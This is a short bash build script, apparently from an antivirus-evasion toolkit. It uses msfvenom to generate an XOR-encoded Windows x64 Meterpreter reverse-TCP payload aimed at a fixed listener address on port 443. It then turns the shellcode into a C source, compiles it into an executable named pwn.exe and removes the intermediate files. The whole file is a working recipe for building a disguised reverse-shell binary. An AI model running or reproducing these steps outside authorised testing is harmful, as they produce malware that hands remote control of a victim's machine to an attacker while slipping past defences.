#!/bin/bash          
# example script for building executables with 64bit payload
. build/global_win64.sh
# make meterpreter reverse payload
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.116.142 lport=443 -e x64/xor -f c --platform Windows > sc.txt
# format the shellcode for make_avet
./format.sh sc.txt > scclean.txt && rm sc.txt
# call make_avet, compile 
./make_avet -f scclean.txt -X -E
$win64_compiler -o pwn.exe avet.c
# cleanup
rm scclean.txt && echo "" > defs.h
